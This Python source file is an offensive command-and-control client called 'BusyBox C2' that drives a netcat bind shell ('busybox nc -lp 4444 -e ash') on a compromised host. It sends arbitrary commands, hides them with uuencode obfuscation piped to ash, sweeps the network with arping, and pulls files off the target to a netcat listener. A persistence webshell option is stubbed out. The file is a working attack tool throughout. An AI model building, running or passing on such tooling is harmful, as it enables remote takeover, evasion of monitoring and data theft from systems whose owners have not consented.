from pyfiglet import Figlet
import socket, select, sys, time
import subprocess
import os
import random
import threading

def show_banner():
    print(Figlet(font="slant").renderText("BusyBox C2"))

def send_cmd(socket, cmd):
    marker = "__END_OF_CMD_{}__".format(int(time.time()*1000))
    full_cmd = cmd + " ; echo " + marker
    socket.sendall((full_cmd + "\n").encode())
    buf = bytearray()
    printed = 0
    marker_b = marker.encode()
    while True:
        r, _, _ = select.select([socket], [], [], 0.5)
        if r:
            try:
                chunk = socket.recv(4096)
            except BlockingIOError:
                continue
            if not chunk:
                if printed < len(buf):
                    sys.stdout.write(buf[printed:].decode(errors="replace"))
                    sys.stdout.flush()
                return [bytes(buf)]
            buf.extend(chunk)
            idx = buf.find(marker_b)
            if idx != -1:
                if printed < idx:
                    sys.stdout.write(buf[printed:idx].decode(errors="replace"))
                    sys.stdout.flush()
                return [bytes(buf)]
            else:
                if len(buf) > printed:
                    sys.stdout.write(buf[printed:].decode(errors="replace"))
                    sys.stdout.flush()
                    printed = len(buf)
        else:
            continue

def show_cmd_output(cmd_output):
    if cmd_output:
        sys.stdout.write(b"".join(cmd_output).decode(errors="replace"))
        sys.stdout.flush()

def cmd_obfuscation_ascii(raw_cmd):
    cmd_to_get_cmd_ascii_version = 'printf ' + '"' + raw_cmd + '"' + ' | busybox uuencode - | sed -n "2p"'
    #print(cmd_to_get_cmd_ascii_version)
    ascii_cmd = subprocess.check_output(cmd_to_get_cmd_ascii_version, shell=True, text=True)
    #print(ascii_cmd)
    payload = "s=\"" + ascii_cmd.rstrip("\n").replace("`", "\`").replace("\"", "\\\"") + "\";printf 'begin 644 -\\n%s\\n`\\nend\\n' $s|busybox uudecode -o /dev/stdout|ash"
    #print(payload)
    return payload

def discover_arp_scan():
    net_ip = input("Network IP (ex: 192.168.1.0): ")
    range = input("Range (max: 254): ")

    cmd = "for i in $(seq 1 " + range + "); do arping -c 1 -w 0 " + net_ip[:-1] + "$i >/dev/null 2>&1 && echo \"[+]" + net_ip[:-1] + "$i\"; done"
    print(cmd)
    return cmd

def download_listener(listener_cmd, listening_port):
    print(f"Listening on {server_ip}:{listening_port}")
    os.system(listener_cmd)

def download(socket):
    file_name = input("File to download: ")
    listening_port = random.randint(1024, 65534)
    listener_cmd = "nc -lp " + str(listening_port) + " > " + file_name

    # Send command to get the file with a delay to wait sevrer availability
    cmd = "sleep 0.5; nc " + server_ip + " " + str(listening_port) + " < " + file_name
    if "obfuscation_ascii" in options:
        cmd = cmd_obfuscation_ascii(cmd)
    send_cmd(socket, cmd)
    t = threading.Thread(target=send_cmd, args=(socket, cmd,))
    t.start()

    # Launch listener to receive file
    os.system(listener_cmd)

    return listening_port, t

def main():
    show_banner()

    global server_ip
    server_ip = "127.0.0.1"
    server_port = 4444

    payload = "busybox nc -lp " + str(server_port) + " -e ash"
    
    print(f"[*] Payload to execute: {payload}\n")

    print(f"[...] Initialization of TCP connection to {server_ip}:{server_port}")
    while True:
        try:
            s = socket.create_connection((server_ip, server_port))
            print("[+] New connection !\n")
            break
        except KeyboardInterrupt:
            exit(0)
        except:
            pass

    s.setblocking(False)

    prompt = " (busybox-c2)> "
    global options
    options = []

    try:
        while True:
            try:
                cmd = input(prompt)

                match cmd.strip().lower():
                    case 'exit' | '/exit':
                        break
                    case '/options_disable' | '/o_d':
                        options.clear()
                        prompt = " (busybox-c2)> "
                    case '/options_show' | '/o_s' | '/options' | '/o':
                        for option in options:
                            print(f"{option} ")
                    case '/obfuscation_ascii' | '/obf_a':
                        options.append('obfuscation_ascii')
                        prompt = " (busybox-c2)[+]> "
                    case '/scan_discover':
                        cmd = discover_arp_scan()
                        if "obfuscation_ascii" in options:
                            cmd = cmd_obfuscation_ascii(cmd)
                        send_cmd(s, cmd)
                    case '/download':
                        # use netcat
                        download(s)
                    case '/persistence_webshell':
                        # launch web server and drop pwnyshell
                        pass
                    case _:
                        if "obfuscation_ascii" in options:
                            cmd = cmd_obfuscation_ascii(cmd)
                            print(f"Executed command: {cmd}\n")
                            #break

                        cmd_output = send_cmd(s, cmd)
                        #show_cmd_output(cmd_output)
            except (EOFError, KeyboardInterrupt):
                break
            if not cmd:
                continue
    finally:
        s.close()
    

if __name__ == "__main__":
    main()
